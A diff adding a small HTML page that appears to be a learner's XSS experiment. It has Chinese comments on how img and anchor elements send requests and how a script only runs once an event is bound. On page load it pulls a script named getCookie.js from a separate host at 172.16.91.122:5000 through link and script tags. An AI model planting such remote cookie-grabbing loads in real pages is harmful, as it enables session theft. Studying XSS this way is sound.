@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Document</title>
+  <link rel="stylesheet" href="http://172.16.91.122:5000/getCookie.js">
+  <style>
+  </style>
+</head>
+<body>
+  <!-- <a href="javascript:" onclick="getXssCode()">点击试试</a> -->
+  <button onclick="getXssCode()">点我试试</button>
+  <script>
+    function getXssCode(){
+      console.log('执行了')
+      // const img = document.createElement('img')
+      // img.src = 'http://172.16.91.122:5000/getCookie.js'
+      // document.body.appendChild(img)
+
+      const domA = document.createElement('a')
+      // 这种情况只是将资源加载浏览器而已，并不会执行。。。
+      domA.href = 'http://172.16.91.122:5000/getCookie.js'
+      domA.innerHTML = '点我'
+      // 还有添加到页面的img，都是元素增加到页面，目的是利用src发送请求
+      document.body.appendChild(domA)
+
+      // 而要想执行脚本，需要绑定事件，然后触发事件
+      domA.onclick = function(){
+        alert('我被点击了')
+      }
+    }
+
+  </script>
+  <script type="text/javascript" src='http://172.16.91.122:5000/getCookie.js'></script>
+</body>
+</html>
